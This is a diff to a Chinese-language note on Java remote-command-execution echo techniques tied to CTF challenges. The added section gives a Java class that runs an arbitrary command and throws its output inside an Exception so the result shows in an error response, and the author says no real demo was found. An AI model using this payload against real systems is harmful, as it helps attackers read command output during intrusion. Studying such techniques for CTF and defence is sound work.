@@ -4,6 +4,31 @@
 
 >一般web服务是想办法获得response对象，可以参考[2021RCTF ezshell](https://github.com/Firebasky/ctf-Challenge/tree/main/RCTF-2021-EZshell)
 
+### 异常回显
+
+我们将命令执行的结果给Exception(result),因为Exception可以传递string,在抛出异常throw e;之后在命令执行的过程中如果目标的代码逻辑存在过程中错误抛出异常就可以看到回显内容
+
+```java
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+public class RunCheckConfig {
+public RunCheckConfig(String  args) throws Exception
+{
+Process proc = Runtime.getRuntime().exec(args);
+BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+StringBuffer sb = new StringBuffer();
+String line;
+while ((line = br.readLine()) != null)
+{
+sb.append(line).append("\n");
+}
+String result = sb.toString();
+Exception e=new Exception(result);
+throw e;
+}
+}
+```
+**目前暂时没有找到真实的demo.....**
 
 ### URLClassLoader抛出异常
 
